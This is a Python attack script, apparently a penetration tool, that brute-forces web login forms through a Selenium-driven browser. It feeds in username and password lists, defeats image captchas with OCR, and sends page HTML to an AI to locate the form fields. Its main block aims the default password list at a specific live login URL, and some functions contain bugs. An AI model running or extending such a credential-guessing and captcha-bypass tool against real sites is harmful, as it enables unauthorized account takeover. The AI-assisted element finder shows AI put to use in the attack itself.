#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   Bro_Brute
@DateTime :  2024/1/1 15:51


用浏览器爆破
'''
import time

from selenium import webdriver
from selenium.webdriver.common.by import By
import ddddocr
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.remote.webelement import WebElement
from selenium.webdriver.support.wait import WebDriverWait






class Bro:
    b: webdriver.Chrome
    usernameInput: WebElement
    passwordInput: WebElement
    captchaInput: WebElement
    captchaImg: WebElement
    loginBtn: WebElement

    def __init__(self, url, users, pwds):
        self.url = url
        self.users = users
        self.pwds = pwds

        def get_options(options, debug=True):
            options.add_argument("start-maximized")
            if not debug:
                options.add_argument("--headless=new")
                options.add_argument("--disable-gpu")
                options.add_argument("--no-sandbox")
                options.add_argument("--disable-dev-shm-usage")
                options.add_argument("--disable-extensions")
                options.add_argument("--disable-infobars")
                options.add_argument("--disable-logging")
                options.add_argument("--silent")
                options.add_argument("--log-level=3")
                options.add_experimental_option("detach", True)
                options.add_experimental_option("excludeSwitches", ["enable-logging"])
            return options

        # 浏览器
        self.b = webdriver.Chrome(executable_path="/Users/dpdu/PycharmProjects/BAP-Suite/chrome-mac-arm64/chromedriver", options=get_options(webdriver.ChromeOptions()))


        # 验证码
        self.use_captcha = False

    def find_element_ex(self, locators):
        # 基础方法，兼容NoSuchElementException
        for expr, _type in locators.items():
            # TODO：可用partial重构
            if _type == "xpath":
                try:
                    item = self.b.find_element(by=By.XPATH, value=expr)
                    return item

                except NoSuchElementException:
                    continue

            elif _type == "css":
                try:
                    item = self.b.find_element(by=By.CSS_SELECTOR, value=expr)
                    return item

                except NoSuchElementException:
                    continue



    def find_user(self):
        user_locators = {
            "//input[@placeholder='账号']": "xpath",
            "//input[@placeholder='username']": "xpath",
            "//input[@placeholder='user']": "xpath",
            "//input[@placeholder='用户名']": "xpath",
        }
        self.usernameInput = self.find_element_ex(user_locators)



    def find_pass(self):
        # PASS
        locators = {
            "//input[@type='password']": "xpath",
            "//input[@placeholder='密码']": "xpath",
            "//input[@placeholder='password']": "xpath",
            "//input[@placeholder='pass']": "xpath",
            "//input[@placeholder='凭据']": "xpath",
        }

        self.passwordInput = self.find_element_ex(locators)


    def find_captcha_input(self):
        locators = {
            "//input[@placeholder='验证码']": "xpath",
            "//input[@placeholder='captcha']": "xpath",
        }
        self.captchaInput = self.find_element_ex(locators)

    def find_login_btn(self):
        locators = {
            "//button[contains(., '登录')]": "xpath",
            "//button[contains(., 'login')]": "xpath",
            "//button[contains(., '登 录')]": "xpath",
        }
        self.loginBtn = self.find_element_ex(locators)

    def find_captcha_img(self):
        # 验证码 CODE captcha
        captcha_locators = {
           "//div[@class='login-code']/img": "xcpath",
            "div.login-code img": "css"
       }
        self.captchaImg =  self.find_element_ex(captcha_locators)


    def init_visit(self):
        """
        - 探活
        - 识别账号密码框
        """
        self.b.get(self.url)
         # 显式等待，直到页面的某个元素加载完成

        # wait = WebDriverWait(self.b, 15)
        self.b.implicitly_wait(3) # seconds

        # AI finder
        self.find_by_ai()

        # generic finder
        self.find_user()
        self.find_pass()
        self.find_captcha_img()
        self.find_captcha_input()
        self.find_login_btn()

        return self

    def do_ocr(self):
        if not hasattr(self, "ocr"):
            # self.ocr = ddddocr.DdddOcr(show_ad=False, beta=True, det=True)
            self.ocr = ddddocr.DdddOcr(show_ad=False)

        image_bytes = self.captchaImg.screenshot_as_png # WebElement
        # ?
        code = self.ocr.classification(image_bytes)
        return code

    def login(self, username, password):
        # 填写用户名、密码
        self.usernameInput.clear()
        self.usernameInput.send_keys(username)

        self.passwordInput.clear()
        self.passwordInput.send_keys(password)

        # 识别验证码
        code = self.do_ocr()

        self.captchaInput.clear()
        self.captchaInput.send_keys(code)

        # 提交登录
        self.loginBtn.click()



    def run(self):
        self.init_visit()

        # 自动填写
        for username, password in zip(self.users, self.pwds):
            # 识别用户名、密码表单
            self.login(username, password)
            time.sleep(5)


        time.sleep(60)

            # 关闭浏览器
        self.b.close()


    def find_by_ai(self):
        html = self.b.page_source
        prompt = '''我希望定位几个重要的元素：（1）用户名、（2）密码、（3）验证码的输入框元素、（4）验证码图片的元素、（5）登录框的按钮元素
- 请你寻找最合适的选择器，可以是XPATH，也可以是CSS。
要求：以JSON格式返回，例如
{
"usernameInput": ("<选择器>", "xpath"),
"passwordInput": ("<选择器>", "css"),
"captchaInput": ("<选择器>", "css"),
"captchaImg": ("<选择器>", "xpath"),
"loginBtn": ("<选择器>", "xpath"),
}
-------下面是HTML源代码-------------
%s
''' % html
        expr_dicts = ask_ai(prompt)
        for _attr, desc in expr_dicts.items():
            # if v[1] == "xpath":
            setattr(self, _attr, desc[0])
            # elif v[0] == "css":
            #     setattr(self, _attr, desc[0])






def brute(this, args):
    users = set()
    pwds = set()

    # 加载账号/密码库
    if hasattr(args, 'username_file'):
        with open(args.username_file, "r") as f:
            users = [u.strip() for u in f.readlines()]
            users = set(users)
    elif hasattr(args, 'user'):
        # TODO, 多个用户名
        users = args.user
        users = args.split(",")

    if hasattr(args, 'password_file'):
        with open(args.password_file, "r") as f:
            pwds = [p.strip() for p in f.readlines()]
            pwds = set(pwds)
    elif hasattr(args, 'pass'):
        # TODO, 多个密码
        pwds = getattr(args, 'pass')
        pwds = pwds.split(",")

    b = Bro("https://vue.ruoyi.vip/login", users, pwds)




if __name__ == '__main__':
    b = Bro("https://vue.ruoyi.vip/login", ["admin"], ["admin", "123456", "111111", "admin123", "Admin123"])
    b.run()
